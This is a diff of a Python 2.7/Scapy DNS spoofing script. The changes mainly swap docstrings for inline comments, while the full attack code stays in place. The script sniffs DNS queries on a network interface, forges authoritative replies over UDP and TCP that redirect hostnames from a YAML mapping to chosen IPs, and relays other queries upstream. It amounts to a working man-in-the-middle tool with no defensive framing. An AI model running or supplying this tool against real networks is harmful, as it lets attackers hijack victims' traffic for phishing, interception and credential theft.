@@ -1,13 +1,16 @@
 #!/usr/bin/env python2
 # -*- coding: utf-8 -*-
 #
-# dns_spoofer27.py -- DNS spoof / relay for Python-2.7 + Scapy-2.4.5
-#
+# dns.py -- DNS spoof / relay for Python-2.7 + Scapy-2.4.5
+# This script intercepts DNS queries on an interface, spoofs answers for
+# matched hostnames according to a YAML mapping, and optionally relays
+# unmatched queries to an upstream resolver.
+
 
 from __future__ import print_function, absolute_import
 
 import argparse
-import ipaddress            # pip2 install ipaddress
+import ipaddress         
 import logging
 import os
 import signal
@@ -24,16 +27,12 @@ from scapy.all import (
     send, sniff,
 )
 
-# --------------------------------------------------------------------------- #
-# helpers
-# --------------------------------------------------------------------------- #
 def _u(s):
-    """Return a unicode object under Py-2, no-op on Py-3."""
     try:
-        return unicode(s)                # noqa: F821
-    except NameError:                    # running under Py-3 (irrelevant here)
+        return unicode(s)            
+    except NameError:                    
         return s
-
+#configure root logger: DEBUG if verbose, ERROR if quiet,else INFO (default).
 def setup_logging(verbose, quiet):
     if verbose and quiet:
         quiet = False
@@ -43,64 +42,61 @@ def setup_logging(verbose, quiet):
         format='%(asctime)s %(levelname).1s: %(message)s',
         datefmt='%H:%M:%S',
     )
-
+#Lower-case, strip trailing dot, always unicode.
 def _normalise_qname(name):
-    """Lower-case, strip trailing dot, always unicode."""
     return _u(name).rstrip(u'.').lower()
 
-# --------------------------------------------------------------------------- #
-# worker thread
-# --------------------------------------------------------------------------- #
+#Thread handling DNS spoofing over both UDP and TCP.
 class DNSSpoofer(threading.Thread):
-    """Spoof or relay DNS answers over UDP *and* TCP."""
 
     def __init__(self, iface, mapping, upstream='8.8.8.8',
                  relay=False, ttl=300, bpf=None):
         threading.Thread.__init__(self)
         self.daemon    = True
-        self.iface     = iface
-        self.mapping   = mapping
-        self.upstream  = upstream
-        self.relay     = relay
-        self.ttl       = ttl
-        self.bpf       = bpf or 'udp or tcp port 53'
+        self.iface     = iface #interface to sniff/inject
+        self.mapping   = mapping #host->IP or host->list[IP]
+        self.upstream  = upstream #relay target for misses
+        self.relay     = relay #whether to relay unmatched
+        self.ttl       = ttl #TTL for forged answers
+        self.bpf       = bpf or 'udp or tcp port 53' #base BPF filter
 
         self._running  = threading.Event()
         self._running.set()
         self._tcp_thr  = None
 
-    # ------------------------------------ lookup / crafting helpers
+    #maping lookup & response crafting helpers
     def _lookup(self, qname):
-        """Return list[str] of spoof IPs or None."""
         qname = _normalise_qname(qname)
 
         if qname in self.mapping:
             val = self.mapping[qname]
             return val if isinstance(val, list) else [val]
 
-        # wildcard (“*.example.com”)
+        #wildcard supports: *.example.com
         it = self.mapping.iteritems() if hasattr(self.mapping, 'iteritems') else self.mapping.items()
         for pattern, val in it:
             if pattern.startswith(u'*.') and qname.endswith(pattern[2:]):
                 return val if isinstance(val, list) else [val]
         return None
-
+    
+    #generate a linked DNSRR chain for all IPs to include in answer
     def _build_answers(self, qname, ips, qtype):
         answers = None
         for ip in ips:
             rr = DNSRR(rrname=qname, type=qtype, ttl=self.ttl, rdata=str(ip))
             answers = rr if answers is None else answers / rr
         return answers
-
+    
+    #construct a spoofed DNS response packet matching the query.
     def _forge_response(self, pkt, ips):
         q      = pkt[DNSQR]
         answer = self._build_answers(q.qname, ips, q.qtype)
         dns    = DNS(id=pkt[DNS].id, qr=1, aa=1,
                      qd=q, ancount=len(ips), an=answer)
-
+        #swap src/dst for IP or IPv6
         ip_l   = IP(src=pkt[IP].dst, dst=pkt[IP].src) if IP in pkt else \
                  IPv6(src=pkt[IPv6].dst, dst=pkt[IPv6].src)
-
+         #wrap in UDP or TCP
         if UDP in pkt:
             udp = UDP(sport=53, dport=pkt[UDP].sport)
             return ip_l / udp / dns
@@ -111,7 +107,7 @@ class DNSSpoofer(threading.Thread):
                       ack=pkt[TCP].seq + len(pkt[TCP].payload))
             return ip_l / tcp / dns
 
-    # ------------------------------------ packet processors
+    #Packet procesing:intercept queries & reply or relay
     def _process_udp(self, pkt):
         if not pkt.haslayer(DNS) or pkt[DNS].qr != 0:
             return
@@ -134,7 +130,7 @@ class DNSSpoofer(threading.Thread):
         elif self.relay:
             self._relay_upstream(pkt)
 
-    # ------------------------------------ upstream relay (UDP-only)
+    #Upstream relay for unmatched queries(UDP-only)
     def _relay_upstream(self, pkt):
         qname = pkt[DNSQR].qname.decode()
         sock  = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -147,17 +143,17 @@ class DNSSpoofer(threading.Thread):
             return
         finally:
             sock.close()
-
+        #wrap reply in correct IP/UDP
         ip_l   = IP(src=pkt[IP].dst, dst=pkt[IP].src)
         udp_l  = UDP(sport=53, dport=pkt[UDP].sport)
         send(ip_l / udp_l / DNS(data), iface=self.iface, verbose=0)
 
-    # ------------------------------------ thread lifecycle
+     #thread lifecycle:start TCP sniffer thread, run UDP sniffer here
     def run(self):
         logging.info('DNS spoofing on %s  (relay=%s)  filter="%s"',
                      self.iface, self.relay, self.bpf)
 
-        # TCP sniffer in a classic Py-2 style thread
+        #TCP snifer
         self._tcp_thr = threading.Thread(
             target=lambda: sniff(
                 iface=self.iface,
@@ -169,7 +165,7 @@ class DNSSpoofer(threading.Thread):
         self._tcp_thr.daemon = True
         self._tcp_thr.start()
 
-        # UDP sniffer runs in this thread
+        #run UDP sniffer in this thread
         sniff(iface=self.iface,
               filter='udp and (%s)' % self.bpf,
               prn=self._process_udp,
@@ -181,9 +177,7 @@ class DNSSpoofer(threading.Thread):
         if self._tcp_thr and self._tcp_thr.is_alive():
             self._tcp_thr.join(0.5)
 
-# --------------------------------------------------------------------------- #
-# YAML mapping loader
-# --------------------------------------------------------------------------- #
+#YAML mapping loader: host->IP or host->list[IP]
 def load_mapping(path):
     raw = yaml.safe_load(open(path, 'rb'))
     if not isinstance(raw, dict):
@@ -198,7 +192,7 @@ def load_mapping(path):
         good = []
         for ip in ips_raw:
             try:
-                ipaddress.ip_address(_u(ip))      # ipaddress needs unicode in Py-2
+                ipaddress.ip_address(_u(ip))# ipaddress needs unicode in Py-2
                 good.append(str(ip))
             except ValueError:
                 logging.warning('Ignoring invalid IP "%s" (host %s)', ip, host_norm)
